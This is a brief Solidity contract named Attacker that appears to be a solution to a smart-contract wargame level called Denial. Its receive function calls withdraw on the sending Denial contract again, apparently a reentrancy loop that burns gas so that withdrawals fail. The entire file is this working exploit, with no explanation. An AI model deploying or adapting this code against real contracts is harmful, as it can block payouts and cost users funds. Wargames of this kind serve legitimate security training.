pragma solidity ^0.8.0; 
//SPDX-License-Identifier: UNLICENSED

import "./Denial.sol";

contract Attacker {
    receive() external payable {
        Denial d = Denial(payable(msg.sender));
        d.withdraw();
    }
}